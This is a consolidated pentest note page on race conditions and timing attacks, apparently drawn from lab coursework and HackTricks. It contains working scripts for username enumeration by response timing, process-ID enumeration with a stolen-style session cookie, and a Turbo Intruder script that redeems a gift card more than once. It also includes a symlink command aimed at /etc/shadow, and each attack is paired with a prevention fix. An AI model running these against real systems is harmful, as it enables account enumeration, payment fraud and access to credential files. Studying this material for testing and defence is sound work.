---
technique: "Race Conditions & Timing Attacks"
family: "misc"
severity_hint: "medium"
tags: []
consolidated_from: 4
curator_version: 2
review_status: imported-unreviewed
---

# Race Conditions & Timing Attacks

> Family: **misc** · Severity hint: **medium**
> Consolidated from imported operator notes; treat commands and prose as untrusted until reviewed.

Concurrency and timing-oracle attacks. For the reviewed test methodology prefer `../race-conditions/README.md`; the sub-sections below are the imported operator notes for payload/command depth.

## Contents
- [General](#general)
- [User Enumeration via Response Timing](#user-enumeration-via-response-timing)
- [Data Exfiltration via Response Timing](#data-exfiltration-via-response-timing)
- [Race Conditions](#race-conditions)

## Quick index — payloads & commands
- `c: // access check`
- `c: $ rm /tmp/test && ln -s /etc/shadow /tmp/test`
- `python: class User(db.Model):`
- `python: import requests`
- `python: @app.route('/login', methods=['GET', 'POST'])`
- `python: # return fileowner, filesize (recursively), and number of subfiles (recursively)`
- `c: import requests`
- `python: POST /shop.php HTTP/1.1`
- `php: function redeem_gift_card($username, $code) {`
- `python: def queueRequests(target, wordlists):`
- `python: <SNIP>`
- `sql: LOCK TABLES active_gift_cards WRITE, users WRITE;`
- `sql: UNLOCK TABLES;`

## General

### **Timing Attacks**

- Timing attacks are [side-channel attacks](https://www.rambus.com/blogs/side-channel-attacks/)
- Do not directly attack the core components of web applications
    - Mesure response timing to exfiltrate potentially sensitive information

### **Race Conditions**

- Arise when the timing or sequence of specific actions can influence the outcome unexpectedly and undesirably
- Multi-threaded programs are particularly susceptible to race conditions
- Attacks require pressice timing, multiple attack attempts might be required

#### [Time-of-check Time-of-use (TOCTOU)](https://cwe.mitre.org/data/definitions/367.html)

TOCTOU vulnerabilities are common in filesystem operations and result from a difference in the `time of check`, i.e., the time when security conditions are checked, and the `time of use`, i.e., the time when the program actually uses the resource. As an example, consider the following C-code that is part of a `setuid` program that reads the `file` variable as an argument

```c
// access check 
if (access(file, W_OK)) {  
	return -1;  
}

// open file
int fd = open(file, O_WRONLY); 
```

The call to `access` checks whether the calling user is allowed to access the specified file. The file is then subsequently opened and operated on. Since the `time of check`, the call to `access`, occurs before the `time of use`, i.e., the call to `open`, this is a classical TOCTOU vulnerability.

To exploit it, we can call the program with a benign file such as `/tmp/test` and manipulate it after the `time of check` but before the `time of use`. We can do so by creating a symlink to a file we are unable to access, such as `/etc/shadow`:

```c
$ rm /tmp/test && ln -s /etc/shadow /tmp/test
```

We need to get the timing right so that the symlink is created after the call to `access` and before the call to `open`. If we succeed, the program now operates on the file `/etc/shadow` although our user cannot access that file, and thus the access check would cause the program to exit. Since the timing is very precise, we might require multiple exploitation attempts.

In web applications, race conditions typically arise when synchronous actions are assumed, but asynchronous actions are the reality. As an example, consider PHP web applications. PHP does not support any form of multithreading and is, as such, a single-threaded language. However, the situation is different if a web server such as Apache runs the PHP web application. That is because Apache (and other web servers) typically spawn multiple worker threads that run the web application simultaneously to allow for better performance. These cases allow for multi-threaded execution, although PHP itself is single-threaded. Settings like these can cause race condition vulnerabilities that web developers might be unaware of.

## User Enumeration via Response Timing

### **Code Review - Identifying the Vulnerability**

```python
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(60))

    def __init__(self, username, password):
        self.username = username
        self.password = password

<SNIP>

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    username = request.form['username']
    user = User.query.filter_by(username=username).first()

    if not user:
        return render_template('index.html', message='Incorrect Details', type='danger')

    pw = request.form['password']
    pw_hash = bcrypt.hashpw(pw.encode(), salt)

    if pw_hash == user.password:
        session['logged_in'] = True
        session['user'] = user.username
        return redirect(url_for('index'))

    return render_template('index.html', message='Incorrect Details', type='danger')
```

1. The database is searched for the user with the provided username
2. If there is no such user, an `Incorrect Details` error message is returned
3. Otherwise, the password is hashed and compared with the hash stored in the database
4. If the passwords match, the login is successful
5. Otherwise, the `Incorrect Details` error message is displayed

#### Why this happens

The DB querie only checks the username and returns a page directly if the username was not found. If the user is found, the password will be hashed and checked which takes more time. Another options could be that the username and password will be used in a single query, but calculating the hash takes longer, the longer the password is.

#### PoC

- Python PoC did not work at all
- Burpsuite Intruder was way better and faster
- Code
    
    ```python
    import requests
    import time
    
    WORDLIST = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
    THRESHOLD_S = 0.050
    URL = "http://198.51.100.13:34086/reset"
    status = 0
    valid_usernames = []
    
    session = requests.Session()
    
    with open(WORDLIST, 'r') as f:
        usernames = [line.strip() for line in f]
    
    start_time = time.time()
    
    for username in usernames:
        response = session.post(URL, data=username)
        elapsed = response.elapsed.total_seconds()
        status += 1
    
        if elapsed > THRESHOLD_S:
            valid_usernames.append((username, elapsed))
            print(f"[+] VALID USERNAME: {username} - {elapsed:.4f}s")
    
        # print status every 100 usernames to reduce I/O overhead
        if status % 100 == 0:
            print(f"Checked: {status}/{len(usernames)} usernames")
    
    total_time = time.time() - start_time
    
    print("\nScan completed!")
    print(f"Total checked: {status} usernames in {total_time:.2f}s")
    print(f"Valid usernames ({len(valid_usernames)}):")
    for user, elapsed in valid_usernames:
        print(f" - {user} [{elapsed:.4f}s]")
    ```
    

<aside>
💡

This can happen in any endpoint where we can supply usernames. For example: `register` `reset` etc.

</aside>

### **Prevention & Patching**

General prevention of timing-based vulnerabilities is difficult and depends on each web application's security issue(s). In our sample case, it suffices to do the database lookup based on username and password combined and only distinguish whether it was successful. The relevant code would then look like this:

Code: python

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    username = request.form['username']
    pw = request.form['password']
    pw_hash = bcrypt.hashpw(pw.encode(), salt)
    user = User.query.filter_by(username=username, password=pw_hash).first()

    if user:
        session['logged_in'] = True
        session['user'] = user.username
        return redirect(url_for('index'))

    return render_template('index.html', message="Incorrect Details", type="danger")

```

Instead of querying the database only for the username, we do a combined lookup based on the username and the password hash.

However, in some instances, this is impossible. Consider a setting where the web application stores an individual password salt for each user. In that case, we can only compute the password hash after doing the database lookup based on the username. In these cases, we can eliminate the timing difference caused by the hashing of the password for valid users by hashing a dummy value if the username is invalid. In that case, the code would look similar to this:

Code: python

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    username = request.form['username']
    user = User.query.filter_by(username=username).first()

    if not user:
	    pw_hash = bcrypt.hashpw(b'dummyvalue', salt)
        return render_template('index.html', message='Incorrect Details', type='danger')

    pw = request.form['password']
    pw_hash = bcrypt.hashpw(pw.encode(), salt)

    if pw_hash == user.password:
        session['logged_in'] = True
        session['user'] = user.username
        return redirect(url_for('index'))

    return render_template('index.html', message='Incorrect Details', type='danger')

```

Note that the web application hashes the value `dummyvalue` when the username is invalid. Thus, the `bcrypt` hash function is called whether the user is valid or invalid, resulting in no noticeable timing difference. However, this approach creates load on the server even for invalid usernames. Therefore, it is vital to implement proper rate-limiting on the login endpoint to eliminate the possibility of server overload and, subsequently, denial-of-service (DoS).

## Data Exfiltration via Response Timing

### **Code Review - Identifying the Vulnerability**

- Example: Web application that shows us files we own on the filesystem

```python
# return fileowner, filesize (recursively), and number of subfiles (recursively)
def get_file_details(path):
    try:
    
				# Returns early if the path does not exists
        if not os.path.exists(path):
            return '', 0, 0

        # number of subfiles
        filecount = 0
        for root_dir, cur_dir, files in os.walk(path):
            filecount += len(files)

        # file size
        path = Path(path)
        filesize = sum(f.stat().st_size for f in path.glob('**/*') if f.is_file())

        # file owner
        owner = path.owner()

        return owner, filesize, filecount

    except:
        return '', 0, 0

<SNIP>

@app.route('/filecheck', methods=['GET'])
def filecheck():

		# Only if we are logged in
    if not session.get('logged_in'):
        return redirect(url_for('index'))

    user = session.get('user')
    filepath = request.args.get('filepath')

		# Calculates before the check and return, takes longer if it exists
    owner, filesize, filecount = get_file_details(filepath)

    if (user == 'root') or (user == owner):
        return render_template('filecheck.html', message="Success!", type="success", file=filepath, owner=owner, filesize=filesize, filecount=filecount)

    return render_template('filecheck.html', message="Access denied!", type="danger", file=filepath)
```

Keep in mind that the function takes longer because it recursively steps through each subdirectory to determine file sizes and the number of files. If we request a single file that is valid, like `/etc/passwd`, the timing difference is similar to an invalid file path because there are no subdirectories to check:

```c
import requests

URL = "http://172.17.0.2:1337/filecheck"
cookies = {"session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZCh4Qw.Lv94ak_WPWEN8Idhwf7l-3a5MH4"}
THRESHOLD_S = 0.003

for pid in range(0, 200):
    r = requests.get(URL, params={"filepath": f"/proc/{pid}/"}, cookies=cookies)

    if r.elapsed.total_seconds() > THRESHOLD_S:
        print(f"Valid PID found: {pid}")
```

<aside>
💡

Remember that this attack's reliability depends on the processing time the web application takes to compute the meta information for the directory. Since the process directories generally do not contain many subdirectories, we must carefully fine-tune our threshold. We can use known valid and known invalid values for this fine-tuning process. Furthermore, the exploit is not entirely reliable, particularly if run over the public internet. Thus, we may need to run the exploit multiple times and eliminate false positives by checking which results come up in multiple runs and which are false positives. Another way we could exploit the vulnerability is by enumerating valid system users by enumerating existing home folders in `/home/`. Since users may keep additional data in their home directories, the exploit becomes more reliable.

</aside>

### PoC

Use Intruder

### **Prevention & Patching**

Generally, preventing timing vulnerabilities is not easy since we must consider differences in processing time and what kind of information these differences might reveal to an attacker. In our case, we must implement the permission check `before` the computation of file meta-information. Thus, the function can return early if the user has insufficient permissions, and the web server can send an early response. Thus, there is no significant timing difference if the user provided a valid or invalid path. We could implement this by adding a `user` argument to the `get_file_details` function and returning early in case of insufficient permissions:

Code: python

```python
# return fileowner, filesize (recursively), and number of subfiles (recursively)
def get_file_details(path, user):
    try:
        if not os.path.exists(path):
            return '', 0, 0

		# permission check
		path = Path(path)
		owner = path.owner()
		if (user != 'root') and (user != owner):
			return '', 0, 0

        # number of subfiles
        filecount = 0
        for root_dir, cur_dir, files in os.walk(path):
            filecount += len(files)

        # file size
        filesize = sum(f.stat().st_size for f in path.glob('**/*') if f.is_file())

        return owner, filesize, filecount

    except:
        return '', 0, 0
```

## Race Conditions

Race conditions in web applications arise when the developers do not account for the simultaneous execution of certain control paths due to multithreading. In particular, this also includes single-threaded languages like PHP if the web server itself supports multithreading. Since many web servers spawn multiple worker threads by default, the prerequisites are met for most default web server configurations

<aside>
💡

Every function could be a possible target. For example, the card generation, redeem etc. Depending if the functions have been secured with a LOCK mechanism.

</aside>

### **Code Review - Identifying the Vulnerability**

- Example: Web shop

```python
POST /shop.php HTTP/1.1
Host: racecondition.htb
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=qvvchpk8h4qnotbniqqffd1nuv

redeem=7204884880747967
```

```php
function redeem_gift_card($username, $code) {
    $gift_card_balance = check_gift_card_balance($code);

    if ($gift_card_balance === 0) {
        return "Invalid Gift Card Code!";
    }

    // update user balance
    $user = fetch_user_data($username);
    $new_balance = $user['balance'] + $gift_card_balance;
    update_user_balance($username, $new_balance);

    // invalidate code
    invalidate_gift_card($code);

    return "Successfully redeemed gift card. Your new balance is: " . $new_balance . '$';
}
```

The code assumes synchronous actions since there are no locks or other mechanisms that would prevent race conditions. To illustrate this further, have a look at the following sequence of events consisting of the important steps of the `redeem_gift_card` function for both threads for a 10$ gift card:

| **Thread 1** | **Thread 2** | **User's Balance** |
| --- | --- | --- |
| `redeem_gift_card("htb-stdnt", 7204884880747967)` | - | `0$` |
| `check_gift_card_balance(7204884880747967)` | - | `0$` |
| `fetch_user_data("htb-stdnt")` | - | `0$` |
| `update_user_balance("htb-stdnt", 10$)` | - | `10$` |
| - | `redeem_gift_card("htb-stdnt", 7204884880747967)` | `10$` |
| - | `check_gift_card_balance(7204884880747967)` | `10$` |
| - | `fetch_user_data("htb-stdnt")` | `10$` |
| - | `update_user_balance("htb-stdnt", 20$)` | `20$` |
| `invalidate_gift_card(7204884880747967)` | - | `20$` |
| - | `invalidate_gift_card(7204884880747967)` | `20$` |

##### **PHP Session Files and File Locks**

- Sessions are stored on the web servers file system
- Server thus needs read and write access to these files
- PHP uses file locks for https://www.php.net/manual/en/function.session-start.php to make sure no unsafe states are reached
- Therefore, these file locks indirectly prevent the exploitation of race conditions if session variables are used in the vulnerable PHP file
- The race condition is only accessible after logging in, so session variables are used
- If we attempt to send multiple requests using the same PHP session, the file locks will prevent simultaneous execution
- We can simply use different sessions in our exploit

##### **Burp Turbo Intruder**

https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack

In the first step, we must generate multiple valid session IDs to avoid running into the file lock issue described above. To do so, we can send the login request to Burp Repeater, send it about `5` times, and take note of the five different `PHPSESSID` cookies:

To exploit the race condition, we will buy a gift card, intercept the request to redeem the code and drop it so it is not redeemed on the backend. We can then send the request to redeem the code to `Turbo Intruder` from Burp's HTTP history:

**Note:** This script does not exist in the latest version of Turbo Intruder. If you are already familiar with Turbo Intruder, feel free to use any other script as a baseline and adjust it to your needs. Otherwise, you can find the `race.py` script in the Turbo Intruder GitHub repository [here](https://github.com/PortSwigger/turbo-intruder/blob/b5c6e2d614cf8db0e9b02a32dd06119161888e17/resources/examples/race.py). You can simply copy and paste it into the Turbo Intruder window and continue from there.

- rade.py
    
    ```python
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                               concurrentConnections=30,
                               requestsPerConnection=100,
                               pipeline=False
                               )
    
        # the 'gate' argument blocks the final byte of each request until openGate is invoked
        for i in range(30):
            engine.queue(target.req, target.baseInput, gate='race1')
    
        # wait until every 'race1' tagged request is ready
        # then send the final byte of each request
        # (this method is non-blocking, just like queue)
        engine.openGate('race1')
    
        engine.complete(timeout=60)
    
    def handleResponse(req, interesting):
        table.add(req)
    ```
    

The turbo intruder window consists of two main parts: the HTTP request at the top and the exploit script at the bottom. The script at the bottom is written in Python, and we can modify it according to our needs. Turbo Intruder inserts a payload into the request wherever a `%s` is specified. In our case, we need to add different session cookies to the requests to avoid running into the file lock issue. Therefore, we will modify the request at the top by replacing the session cookie with the value `%s` such that the corresponding line looks like this:

```python
<SNIP>
Cookie: PHPSESSID=%s
<SNIP>
```

Now we have to specify the payload, which is the second parameter of the `engine.queue` function call. Thus, we modify the exploit script to look like this by inserting the valid session cookies we obtained in the previous step:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

		# the 'gate' argument blocks the final byte of each request until openGate is invoked
    for sess in ["p5b2nr48govua1ieljfdecppjg", "48ncr9hc1rjm361fp7h17110ar", "0411kdhfmca5uqiappmc3trgcg", "m3qv0d1qu7omrtm2rooivr7lc4", "onerh3j83jopd5ul8scjaf14rr"]:
        engine.queue(target.req, sess, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

### **Prevention & Patching**

Now that we have seen how to exploit race condition vulnerabilities let us discuss how to prevent them. Since race conditions can arise in different contexts, prevention depends on the concrete vulnerability. For instance, if the race condition arises due to simultaneous file accesses, it can be prevented by implementing file locks similar to the PHP session file locks. In our case, the race condition exists because of simultaneous database accesses from multiple threads. To prevent this, we need to implement `SQL locks`. They work similarly to file locks. There are `READ` locks which allow the current session to read the table but not write to it. Other sessions are still allowed read access to the table but write access is prevented. Furthermore, there are `WRITE` locks that allow the current session read and write access to the table and prevent all access to the table by other sessions. Thus, our race condition can be prevented by obtaining a `WRITE` lock on the `users` table since the user's balance is updated and a `WRITE` lock on the `active_gift_cards` table since the gift card code is removed. We can achieve this by executing the following SQL query:

Code: sql

```sql
LOCK TABLES active_gift_cards WRITE, users WRITE;

```

After the code has been redeemed, we can release the locks by executing the following query:

Code: sql

```sql
UNLOCK TABLES;

```

This prevents simultaneous access to the database by multiple threads, thus preventing the race condition vulnerability. For more details, check out the SQL documentation on locks [here](https://dev.mysql.com/doc/refman/8.0/en/lock-tables.html).

## HackTricks methodology enrichment

Use `../race-conditions/README.md` for the reviewed state-machine
method. The transport notes below help reduce timing noise; concurrency tests
must stay inside the approved request and side-effect budgets.

### Build a sequential control first

Record the normal state transition, one-time invariant, response, and durable
server-side result with a single request at a time. Choose test accounts and
objects that can be reset. A useful hypothesis names the shared resource and the
atomicity gap—for example, “two redemptions can both pass the remaining-credit
check before either debit commits.”

### Synchronize the smallest useful burst

- HTTP/2 single-packet synchronization can reduce network jitter by withholding
  the final part of a small set of requests and releasing them together.
- When HTTP/2 is unavailable, use HTTP/1.1 last-byte synchronization across
  warmed connections. Treat HTTP/3/QUIC as a separate transport and confirm that
  the application path is equivalent before comparing results.
- Begin with two requests. Increase only when the result is inconclusive and the
  rules of engagement permit it. Stop on unexpected durable state, lockout,
  elevated errors, or latency.

### Remove false negatives

Check whether session-level locking serializes requests; use distinct sessions
only if the invariant is shared across them. Warm connections, separate setup
requests from the candidate transition, and alternate sequential/concurrent
controls. A response race without a durable invariant violation is not enough.

### Hunt hidden substates

Look for multi-step transitions in email changes, MFA enrollment, password reset,
OAuth code redemption, coupon/payment workflows, invitations, and file
processing. Probe the narrow interval between validation and commit with an
independent read or a second permitted action. Record the exact final state and
cleanup; do not infer impact solely from mismatched HTTP responses.

HackTricks source: [Race Condition](https://hacktricks.wiki/en/pentesting-web/race-condition.html)
([snapshot reviewed](https://github.com/HackTricks-wiki/hacktricks/blob/d7dfcf8fa88bc49160a0fec341b16c763660ee4f/src/pentesting-web/race-condition.md)).

## Sources
- `_raw/Web attacks/Web Attacks/Race Conditions & Timing Attacks/General.md`
- `_raw/Web attacks/Web Attacks/Race Conditions & Timing Attacks/User Enumeration via Response Timing.md`
- `_raw/Web attacks/Web Attacks/Race Conditions & Timing Attacks/Data Exfiltration via Response Timing.md`
- `_raw/Web attacks/Web Attacks/Race Conditions & Timing Attacks/Race Conditions.md`
